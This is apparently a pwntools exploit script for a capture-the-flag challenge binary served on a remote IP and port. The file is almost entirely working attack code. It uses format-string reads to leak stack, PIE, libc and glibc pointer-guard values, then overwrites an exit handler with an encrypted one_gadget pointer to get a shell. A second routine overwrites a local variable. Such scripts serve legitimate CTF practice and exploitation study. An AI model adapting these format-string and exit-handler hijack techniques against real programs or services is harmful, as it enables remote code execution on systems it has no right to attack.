#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.185.53.181', 6001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x13b4
# break *exit
breakrva 0x013cf
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def fuzz():
    global io
    io = initialize()

    context.log_level = 'warning'
    for i in range(1, 50):
        io.sendlineafter(b'name? ', f'%{i}$p'.encode())
        io.recvuntil(b'Hi, ')
        leak = io.recvline().strip()
        if leak != b'(nil)':
            leak = int(leak, 16)
            log.warning('leak[%d]: %#x', i, leak)
        else:
            log.warning('leak[%d]: nil', i)

def write_qword(addr, value):
    for i in range(8):
        payload = fmtstr_payload(10, {
            addr+i: value & 0xffff
        }, write_size='short')

        io.sendlineafter(b'name? ', payload)
        io.recvline()

        value = value >> 8

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

# encrypt a function pointer
def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def rce():
    global io
    io = initialize()

    io.sendlineafter(b'name? ', b'%6$p')
    io.recvuntil(b'Hi, ')
    rip = int(io.recvline().strip(), 16) - 0x110

    io.sendlineafter(b'name? ', b'%25$p') # remote
    io.recvuntil(b'Hi, ')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['main']

    payload = b"%11$s".ljust(8, b'\x00') + p64(elf.got['printf']) 
    io.sendlineafter(b'name? ', payload)
    io.recvuntil(b'Hi, ')
    printf = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = printf - libc.sym['printf']

    payload = b"%11$s".ljust(8, b'\x00') + p64(libc.address + 0x1f35e8 + 0x8) 
    io.sendlineafter(b'name? ', payload)
    io.recvuntil(b'Hi, ')
    ptr_guard = u64(io.recv(8).strip().ljust(8, b'\x00'))

    exit_handler = libc.address + 0x1edcb8
    one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
    write_qword(exit_handler, encrypt(libc.address + one_gadgets[0], ptr_guard))

    io.sendlineafter(b'name? ', b'exit')

    log.success('rip: %#x', rip)
    log.success('elf base: %#x', elf.address)
    log.success('printf: %#x', printf)
    log.success('libc base: %#x', libc.address)
    log.success('ptr guard: %#x', ptr_guard)
    log.success('ptr guard @ %#x', libc.address + 0x1f35e8 + 0x8)
    io.interactive()

def idk_why_ghidra_decompile_doesnt_show_i_just_need_to_overwrite_local_variable():
    global io
    io = initialize()

    io.sendlineafter(b'name? ', b'%6$p')
    io.recvuntil(b'Hi, ')
    rip = int(io.recvline().strip(), 16) - 0x110

    target = rip - 0x44
    payload = fmtstr_payload(10, {
        target: 0xdeadc0de
    }, write_size='short')
    io.sendlineafter(b'name? ', payload)
    
    log.success('target: %#x', target)
    io.interactive()

if __name__ == '__main__':
    # fuzz()
    # rce()
    idk_why_ghidra_decompile_doesnt_show_i_just_need_to_overwrite_local_variable()